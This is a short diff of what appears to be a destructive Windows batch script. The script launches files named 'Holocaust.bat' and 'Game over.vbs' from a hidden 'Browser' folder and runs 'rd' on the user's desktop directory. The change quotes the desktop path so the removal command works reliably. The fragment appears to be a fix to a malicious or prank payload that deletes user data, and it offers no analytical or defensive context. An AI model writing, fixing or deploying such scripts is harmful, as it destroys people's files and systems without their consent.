@@ -29,7 +29,7 @@ start "%userprofile%\Browser\Holocaust.bat"
 
 timeout 1 >nul /nobreak
 
-rd %userprofile%\desktop
+rd "%userprofile%\desktop"
 
 start "%userprofile%\Browser\Jaws\Game over.vbs"
 
